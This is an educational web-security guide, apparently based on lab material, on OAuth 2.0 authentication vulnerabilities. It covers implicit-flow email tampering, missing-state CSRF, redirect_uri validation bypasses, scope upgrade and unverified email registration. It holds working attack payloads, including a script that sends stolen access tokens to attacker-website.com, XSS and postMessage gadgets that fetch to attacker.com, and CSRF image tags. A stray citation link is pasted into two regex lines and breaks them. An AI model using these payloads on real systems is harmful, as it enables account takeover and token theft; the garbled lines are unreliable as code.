# OAuth 2.0 Authentication Vulnerabilities

OAuth was designed for *authorisation delegation*, not authentication — yet it is now used as the primary login mechanism on millions of websites. This mismatch between design intent and real-world use creates a class of vulnerabilities that are both severe and widespread: an attacker who can intercept an authorization code or access token for a single OAuth provider can potentially log in as the victim across every client application registered with that provider. The attack surface is split between weaknesses in the *client application* (which has to implement OAuth correctly on its own) and weaknesses in the *OAuth service itself* (misconfiguration of redirect URI validation, scope enforcement, and user identity verification). 

**Fundamental principle: OAuth authentication vulnerabilities nearly always reduce to one of two root causes — either the client application trusts data it receives from the OAuth flow without validating that it actually belongs to the current user (implicit flow manipulation), or the OAuth service delivers authorization codes and tokens to the wrong destination because redirect\_uri validation is weak (redirect-based token theft).**

***

## Reconnaissance: Identifying and Mapping the OAuth Flow

```http
# ── STEP 1: Identify OAuth in the login flow ──────────────────────────────────
# Look for: "Log in with Google / Facebook / GitHub / social media"
# Proxy through Burp → observe the first request in the flow:

GET /authorization?client_id=12345
                  &redirect_uri=https://client-app.com/callback
                  &response_type=token          ← implicit: "token"
                  &scope=openid%20profile
                  &state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com

# Key parameters to note immediately:
#   response_type=token  → implicit flow (access token in URL fragment) ⚠ higher risk
#   response_type=code   → authorization code flow (requires back-channel exchange)
#   state absent?        → CSRF / account linking attack possible ✓
#   redirect_uri value?  → primary attack target — start testing this first

# ── STEP 2: Fetch the discovery documents ─────────────────────────────────────
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-authorization-server.com

GET /.well-known/oauth-authorization-server HTTP/1.1
Host: oauth-authorization-server.com

# These return JSON config disclosing:
#   authorization_endpoint  → where to send auth requests
#   token_endpoint          → where codes are exchanged
#   userinfo_endpoint       → where to fetch user data
#   registration_endpoint   → dynamic client reg (SSRF risk if unprotected)
#   scopes_supported        → what data you could request
#   response_types_supported → what grant types are available
#   request_uri_parameter_supported → SSRF via request_uri possible?
#   jwks_uri                → public keys for ID token validation

# ── STEP 3: Map the complete OAuth flow in Burp Proxy ────────────────────────
# Use Burp's Logger or Proxy History, filter by Host = oauth provider domain.
# Document each request/response in sequence:
# 1. GET /auth?...           → initial authorization request
# 2. POST /login             → user enters credentials at provider
# 3. POST /consent           → user grants permission
# 4. GET /callback?code=...  → code delivered to client
# 5. POST /token             → code exchanged for token (server-to-server)
# 6. GET /userinfo           → token used to fetch identity
# 7. POST /authenticate      → client logs user in with identity data
#
# In the implicit flow: steps 5 is absent; step 4 delivers token in fragment (#)
# Step 7 is the critical POST request — this is where implicit flow attacks happen
```

***

## Vulnerability 1: Implicit Grant — Authentication Bypass via POST Manipulation

In the implicit flow, the access token is extracted from the URL fragment by JavaScript and then sent to the client application's own server via a POST request to establish a session. The server receives an email (or user ID) and a token — but if it does not validate that the token *belongs to* the submitted email, the email can simply be changed to any victim's address. 

```http
# ── NORMAL IMPLICIT FLOW SEQUENCE ─────────────────────────────────────────────
# 1. Browser receives: /callback#access_token=z0y9x8w7v6u5&...
# 2. JavaScript extracts token from window.location.hash
# 3. JavaScript calls /userinfo → receives {"username":"wiener","email":"wiener@normal-user.net"}
# 4. JavaScript posts to /authenticate to establish a session:

POST /authenticate HTTP/1.1
Host: client-app.com
Content-Type: application/json

{
    "email": "wiener@normal-user.net",
    "username": "wiener",
    "token": "z0y9x8w7v6u5"
}

# Server response: 302 Found → Set-Cookie: session=... → logged in as wiener

# ── VULNERABILITY: Server trusts email without validating token matches it ─────
# The server receives email + token but only validates that the token is a
# VALID token from the OAuth provider. It does NOT check that the token
# was issued for the user identified by the email field.
# → An attacker can simply change the email in this POST request.

# ── ATTACK STEPS ──────────────────────────────────────────────────────────────
# Step 1: Complete the OAuth flow normally with your OWN account.
#         Note the POST /authenticate request in Burp Proxy.

# Step 2: Intercept or capture the POST /authenticate request:
POST /authenticate HTTP/1.1
Host: client-app.com
Content-Type: application/json

{
    "email": "wiener@normal-user.net",
    "username": "wiener",
    "token": "z0y9x8w7v6u5"
}

# Step 3: In Burp Repeater, change the email to the target victim's email:
POST /authenticate HTTP/1.1
Host: client-app.com
Content-Type: application/json

{
    "email": "carlos@carlos-montoya.net",   ← changed to victim's email ✓
    "username": "carlos",
    "token": "z0y9x8w7v6u5"                ← YOUR valid token (not victim's)
}

# Step 4: Send the request.
# Vulnerable server: validates token is valid → assigns session for "carlos" ✓
# Response: 302 Found → Set-Cookie: session=[victim's session]
# → Use "Request in browser → in original session" → logged in as carlos ✓

# ── WHY THIS WORKS ────────────────────────────────────────────────────────────
# The server trusts the email parameter from the POST body, treating it like a
# trusted identity assertion. But the POST body comes from the attacker's browser
# (via JavaScript in the implicit flow) — it is attacker-controlled.
# The server has no server-side secret (like client_secret) to validate against,
# so it cannot cryptographically bind the token to the submitted email.
#
# In the code flow: this attack is impossible because the token exchange happens
# server-to-server; the attacker cannot intercept or modify that request.

# ── VARIATIONS TO TEST ────────────────────────────────────────────────────────
# Try changing: "username" field alone
# Try changing: "sub" or "user_id" if present in the POST body
# Try changing: the JSON structure to add extra fields (e.g., "role": "admin")
# Try: sending a completely fabricated token with a valid email
#   → If server validates the token first and then uses the email: attack works
#   → If server ties token to session and cross-references: attack fails
```

***

## Vulnerability 2: Flawed CSRF Protection (Missing `state` Parameter)

When the `state` parameter is absent or not validated, an attacker can pre-generate an OAuth authorization URL, trick a victim's browser into completing the OAuth flow, and have the resulting code or token bound to the attacker's session — or force the victim to link their account to the attacker's social media profile. 

```
Attack 1: Forced OAuth profile linking (account takeover)
─────────────────────────────────────────────────────────────────────────────
Scenario:
  Application supports both password login AND "Link your social media account"
  The linking flow uses OAuth but does NOT include a state parameter.

Normal linking flow:
  1. User (logged in) clicks "Link social media account"
  2. Browser → GET /auth?client_id=...&redirect_uri=...&response_type=code
  3. User approves → GET /callback?code=LINK_CODE
  4. Client app exchanges code → associates social media account with user's profile

Attack:
  1. Attacker initiates the linking flow with THEIR OWN browser
  2. Burp Proxy: intercept the GET /callback?code=LINK_CODE request
     (DO NOT forward it — the code is not yet consumed)
  3. Attacker has: /callback?code=ATTACKER_LINK_CODE
                   (this code will link the OAuth account to whoever completes step 4)

  4. Attacker delivers this URL to the victim:
     <img src="https://client-app.com/callback?code=ATTACKER_LINK_CODE">
       OR
     <iframe src="https://client-app.com/callback?code=ATTACKER_LINK_CODE">
       OR
     Direct link in a phishing email / malicious page

  5. Victim's browser (while logged in to client-app.com as themselves)
     automatically requests: GET /callback?code=ATTACKER_LINK_CODE

  6. Client app: no state validation → processes the code
     Associates ATTACKER's social media account with VICTIM's client-app account

  7. Attacker: uses "Log in with social media" using their own social media account
     → Linked to victim's account → logged in as victim ✓

Key: without state parameter, the /callback endpoint cannot distinguish
     between a legitimate callback for THIS user's session
     vs. a CSRF-delivered callback injected by an attacker.
```

```http
# ── ATTACK 2: Login CSRF (force victim to log in as attacker) ─────────────────
# Scenario: site uses ONLY OAuth for login (no password option)
# Missing state → attacker can force victim to log in as attacker's account

# Attacker initiates OAuth flow for their own account:
GET /auth?client_id=12345&redirect_uri=https://client-app.com/callback
         &response_type=code&scope=openid%20profile HTTP/1.1
Host: oauth-authorization-server.com
# Logs in, approves → intercepts before callback is followed

# Captures callback URL:
https://client-app.com/callback?code=ATTACKER_CODE

# Delivers to victim (e.g., via CSRF payload on attacker's page):
<img src="https://client-app.com/callback?code=ATTACKER_CODE" width="0" height="0">

# Victim's browser (while visiting attacker's page):
GET /callback?code=ATTACKER_CODE HTTP/1.1
Host: client-app.com
Cookie: session=VICTIM_SESSION

# Client app: no state validation → exchanges ATTACKER_CODE → victim's browser
# is now logged in as ATTACKER's account
# → Victim unknowingly uses a session controlled by the attacker
# → Attacker can extract victim data via stored forms, credit cards, etc.

# ── TESTING FOR MISSING STATE ─────────────────────────────────────────────────
# In Burp Proxy, check the initial GET /auth? request:
# state parameter present? → check if it's validated at /callback
# state parameter absent?  → CSRF vulnerability confirmed

# To verify state validation:
# 1. Complete OAuth flow normally → note state value
# 2. In a second browser session, initiate a new OAuth flow → get a new state value
# 3. Replace the state in the second callback with the state from the first session
# 4. If accepted → state not session-bound → validation flawed ✓
```

***

## Vulnerability 3: Leaking Authorization Codes via `redirect_uri` Manipulation

The `redirect_uri` parameter controls where the OAuth server delivers the authorization code. If the OAuth provider's validation is weak, an attacker can redirect the code to an attacker-controlled domain. 

### Testing `redirect_uri` Validation Weaknesses

```
Test methodology (run in order, first failure reveals the validation type):
─────────────────────────────────────────────────────────────────────────────

Registered legitimate URI: https://client-app.com/callback

Test 1: Complete external domain
  redirect_uri=https://attacker-website.com/callback
  → Error: "invalid_redirect_uri" → external domains blocked
  → Proceed to Test 2

Test 2: Subdomain of legitimate domain
  redirect_uri=https://subdomain.client-app.com/callback
  → Error: subdomain not on whitelist
  → OR: accepted → wildcard subdomain match → vulnerable ✓
    Can attacker take over any subdomain? → subdomain takeover research

Test 3: Prefix/startswith bypass
  redirect_uri=https://client-app.com.attacker.com/callback
  → Accepted? → startsWith("https://client-app.com") check → vulnerable ✓

Test 4: Path traversal
  redirect_uri=https://client-app.com/oauth/callback/../../example/path
  → Accepted? → path traversal allowed → redirect arrives at /example/path
  → Find exploitable page at the traversed path ✓

Test 5: Appended fragment
  redirect_uri=https://client-app.com/callback#@attacker-website.com
  → Test if fragment confuses URI parser

Test 6: URL credential injection (RFC 3986 userinfo)
  redirect_uri=https://default-host.com&@foo.evil-user.net#@bar.evil-user.net/
  → Some parsers: treat "&@foo.evil-user.net" as a new query parameter
  → Others: treat "@foo.evil-user.net" as userinfo in the URI
  → Resulting destination: foo.evil-user.net ✓

Test 7: Duplicate parameter (HPP — HTTP Parameter Pollution)
  GET /auth?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
  → Some servers: take LAST value → evil-user.net wins ✓
  → Some servers: take FIRST value → client-app.com wins ✗

Test 8: Localhost bypass
  redirect_uri=https://localhost/callback
  redirect_uri=https://localhost.evil-user.net/callback
  → Some providers: allow anything starting with "localhost" → vulnerable ✓

Test 9: response_mode change
  → Add/change: response_mode=fragment or response_mode=web_message
  → Different response_modes alter how redirect_uri is parsed
  → Some modes allow wider URI patterns → bypass validation ✓

Test 10: Change response_type alongside redirect_uri
  → response_type=token (implicit) vs. response_type=code (auth code)
  → Different response types may have different validation logic
```

### Attack: Stealing Codes via Open Redirect Proxy Page

When the OAuth server blocks external domains but allows path traversal, the technique chains two weaknesses: path traversal to reach a different page on the whitelisted domain, then an open redirect on that page to forward the code/token to the attacker. 

```
Chain: redirect_uri path traversal → on-site open redirect → attacker domain
─────────────────────────────────────────────────────────────────────────────

Step 1: Confirm path traversal in redirect_uri
  Legitimate: https://client-app.com/oauth/callback
  Test:        https://client-app.com/oauth/callback/../../post?postId=1

  If accepted → redirected to /post?postId=1 with token in URL fragment:
  https://client-app.com/post?postId=1#access_token=z0y9x8w7v6u5&...
  → Path traversal confirmed ✓

Step 2: Find an open redirect on the whitelisted domain
  Look for:
    /post/next?path=https://attacker.com     ← path parameter redirect
    /redirect?url=https://attacker.com       ← url parameter redirect
    /go?to=https://attacker.com              ← to parameter redirect
    JavaScript: location.href = getParam('next')

  Test: /post/next?path=https://attacker-website.com
  → If redirects to attacker-website.com → open redirect confirmed ✓

Step 3: Chain them into a single exploit URL
  redirect_uri = https://client-app.com/oauth/callback/../../post/next
                 ?path=https://attacker-website.com/exploit

  Full crafted authorization URL:
  https://oauth-server.com/auth
    ?client_id=CLIENT_ID
    &redirect_uri=https://client-app.com/oauth/callback/../../post/next
                  ?path=https://attacker-website.com/exploit
    &response_type=token
    &scope=openid%20profile%20email
    &nonce=abc123

Step 4: OAuth server delivers token to:
  https://client-app.com/post/next?path=https://attacker-website.com/exploit
  #access_token=z0y9x8w7v6u5&token_type=Bearer&...

Step 5: /post/next redirects to:
  https://attacker-website.com/exploit
  #access_token=z0y9x8w7v6u5&token_type=Bearer&...
  ← Token still in fragment ✓

Step 6: Exploit server script extracts and exfiltrates the token
```

```html
<!-- ── EXPLOIT SERVER SCRIPT (hosted at attacker-website.com/exploit) ───── -->
<script>
// URL fragment is NOT sent in the HTTP request to attacker server.
// It IS accessible to JavaScript running on this page.
// Two-stage approach: redirect with fragment → extract in JS → re-request with token in query

if (!document.location.hash) {
    // Stage 1: Victim lands here from OAuth redirect (no hash yet in first visit case)
    // → Initiate the OAuth flow so they get redirected back here WITH the token
    window.location = 'https://oauth-server.com/auth'
        + '?client_id=CLIENT_ID'
        + '&redirect_uri=https://client-app.com/oauth/callback/../../post/next'
        + '?path=https://attacker-website.com/exploit/'
        + '&response_type=token'
        + '&nonce=abc123'
        + '&scope=openid%20profile%20email';
} else {
    // Stage 2: Victim arrives with token in fragment
    // Extract token from fragment and send to attacker server as query param
    // (query params ARE sent in HTTP requests → appear in attacker's access logs)
    window.location = 'https://attacker-website.com/log?token='
        + document.location.hash.substr(1);
    // → GET /log?token=access_token=z0y9x8w7v6u5&token_type=Bearer&...
    // → Token appears in attacker's web server access log ✓
}
</script>

<!--
Alternative: use fetch() to silently exfiltrate without a redirect
fetch('https://attacker-website.com/log', {
    method: 'POST',
    body: document.location.hash
});
-->
```

```http
# ── USE THE STOLEN TOKEN: Call /userinfo directly ─────────────────────────────
# For implicit flow tokens: use directly to call resource server
GET /me HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5

# Response:
{
    "username": "carlos",
    "email": "carlos@carlos-montoya.net",
    "apiKey": "secret-api-key-value"
}
# → Victim's identity data and API key captured ✓
# → Access the client app as victim by replaying POST /authenticate with victim's data ✓
```

### Additional Leak Gadgets

```html
<!-- ── XSS: Extract URL fragment containing access token ──────────────────── -->
<!-- If XSS exists on any page of the whitelisted domain: -->
<script>
// URL fragment is accessible to JS on the same origin after OAuth redirect
var token = window.location.hash.match(/access_token=([^&]*)/) [portswigger](https://portswigger.net/web-security/oauth);
fetch('https://attacker.com/log?t=' + token);
</script>


<!-- ── HTML injection: Leak authorization CODE via Referer ────────────────── -->
<!-- If CSP blocks <script> but HTML injection is possible: -->
<!-- Authorization code is in the QUERY STRING (not fragment) in code flow -->
<!-- → Appears in Referer header when external resources are loaded -->

<!-- Inject at /callback?code=AUTHCODE page: -->
<img src="https://attacker-website.com/image.png">
<!-- Browser request: GET /image.png HTTP/1.1
     Host: attacker-website.com
     Referer: https://client-app.com/callback?code=AUTHCODE&state=...
                                                     ↑ CODE LEAKED ✓ -->

<!-- Firefox: sends full URL including query string in Referer by default -->
<!-- Chrome with strict Referrer-Policy: may strip query params from cross-origin Referer -->
<!-- → Test in multiple browsers; Firefox most likely to leak ✓ -->


<!-- ── postMessage gadget: Extract token from child window/iframe ─────────── -->
<script>
// If the whitelisted domain has an insecure postMessage handler:
// e.g., a script that forwards window.location to a parent frame:
window.addEventListener('message', function(e) {
    // insecure: no origin check, forwards location to all listeners
    parent.postMessage(window.location.hash, '*');
});

// Attacker's page opens the OAuth callback in an iframe:
var iframe = document.createElement('iframe');
iframe.src = 'https://client-app.com/oauth/callback#access_token=...';
document.body.appendChild(iframe);

// Listen for the postMessage containing the token:
window.addEventListener('message', function(e) {
    var token = e.data.match(/access_token=([^&]*)/) [portswigger](https://portswigger.net/web-security/oauth);
    fetch('https://attacker.com/log?t=' + token);
});
</script>
```

***

## Vulnerability 4: Flawed Scope Validation (Scope Upgrade)

```http
# ── AUTHORIZATION CODE FLOW: Scope upgrade at /token ─────────────────────────
# User approved: scope=openid email  (limited)
# Attacker controls the client app → modifies the /token request

# Normal token request:
POST /token HTTP/1.1
Host: oauth-authorization-server.com

client_id=12345
&client_secret=SECRET
&redirect_uri=https://malicious-client.com/callback
&grant_type=authorization_code
&code=a1b2c3d4e5f6g7h8
&scope=openid%20email               ← scope user approved

# Scope upgrade attempt (add "profile" without user approval):
POST /token HTTP/1.1
Host: oauth-authorization-server.com

client_id=12345
&client_secret=SECRET
&redirect_uri=https://malicious-client.com/callback
&grant_type=authorization_code
&code=a1b2c3d4e5f6g7h8
&scope=openid%20email%20profile      ← added "profile" ✓

# Vulnerable server: does not validate scope against original auth request
# → Issues token with scope=openid email profile ✓
# → Attacker gains profile data user never consented to share

# Full escalation: try progressively higher scopes:
scope=openid%20email%20profile
scope=openid%20email%20profile%20admin
scope=openid%20email%20profile%20https%3A%2F%2Fapi.provider.com%2Fwrite
scope=openid%20email%20profile%20offline_access   ← adds refresh token ✓


# ── IMPLICIT FLOW: Scope upgrade at /userinfo ─────────────────────────────────
# Access token already issued with scope=openid email
# Attacker uses stolen token → sends request to /userinfo with extra scope:

GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer STOLEN_TOKEN_WITH_LIMITED_SCOPE

# Add scope parameter to the request:
GET /userinfo?scope=openid%20email%20profile HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer STOLEN_TOKEN_WITH_LIMITED_SCOPE

# Vulnerable server: validates token is valid but not that scope matches
# → Returns profile claims (name, picture, birthdate) that were not approved ✓

# Test variations:
# Add scope in query string: /userinfo?scope=profile
# Add scope in POST body:    POST /userinfo with scope=profile
# Add scope in Authorization header:  Bearer token scope=profile
# Use scopes the CLIENT APP was never registered to request
# → If server validates against client registration: blocked
# → If server only validates against token scope: depends on per-request validation


# ── SCOPE ESCALATION VIA REFRESH TOKEN ────────────────────────────────────────
# Refresh tokens are used to get new access tokens silently.
# Test: request broader scope when using refresh token:
POST /token HTTP/1.1
Host: oauth-authorization-server.com

grant_type=refresh_token
&refresh_token=REFRESH_TOKEN_VALUE
&client_id=12345
&client_secret=SECRET
&scope=openid%20email%20profile%20admin   ← escalated scope ✓ (if not validated)
```

***

## Vulnerability 5: Unverified User Registration

```
Attack: Pre-register a fraudulent account with the OAuth provider
─────────────────────────────────────────────────────────────────────────────
Scenario:
  OAuth provider (e.g., a social media site) allows user registration
  WITHOUT verifying the email address.

  Client application trusts the OAuth provider's claims completely.
  Client app uses email address from /userinfo to identify users.

Attack flow:
  1. Attacker knows victim's email: victim@victim.com
  2. Attacker registers at the OAuth provider with email: victim@victim.com
     (provider does NOT verify the email → account created without confirmation)
  3. Attacker initiates "Log in with social media" on the client application
  4. OAuth flow completes → /userinfo returns: {"email":"victim@victim.com",...}
  5. Client application: "I see email victim@victim.com → log in that user"
  6. Attacker logged in as victim ✓

Why this works:
  The client application assumes: "the OAuth provider verified this email"
  The reality: the provider accepted the email without verification
  → Trust delegation fails: garbage in, garbage out

Test methodology:
  1. Register at the OAuth provider with a target user's known email
  2. Note whether the provider sends a verification email (check for confirmation flow)
  3. If no verification required → account created → attempt "Log in with social media"
  4. Check if client app grants access based on the unverified email claim
  5. Also test: what if email_verified=false is in the ID token?
     Does the client app check this claim? (see OpenID Connect section)
```
